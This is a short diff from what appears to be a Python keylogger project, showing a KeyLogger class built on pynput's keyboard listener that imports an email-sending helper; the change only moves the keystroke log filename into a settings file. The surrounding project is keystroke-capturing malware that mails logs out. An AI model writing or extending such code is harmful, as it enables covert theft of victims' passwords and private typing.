@@ -2,13 +2,13 @@ from pynput.keyboard import Key, Listener
 import time
 
 from keylogger.mail import send_email
-from settings import time_iteration, number_of_iterations_end
+from settings import time_iteration, number_of_iterations_end, filenames
 
 
 class KeyLogger:
 
     def __init__(self, file_path):
-        self.filename = "keys_info.txt"
+        self.filename = filenames["keys"]
         self.file_path = "\\".join([file_path, self.filename])
 
         self.keys = []
